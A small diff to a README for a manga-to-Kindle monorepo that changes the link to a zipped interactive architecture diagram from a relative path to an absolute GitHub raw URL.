@@ -1,6 +1,6 @@
 # Manga to Kindle Monorepo
 
-> [Download the interactive architecture diagram](docs/architecture.html.zip?raw=1)
+> [Download the interactive architecture diagram](https://github.com/yomanmf/manga-telegram-orchestrator/raw/refs/heads/main/docs/architecture.html.zip)
 
 The complete production project lives in one repository: Telegram controls,
 the existing manga processing web interface, and browser automation for Send
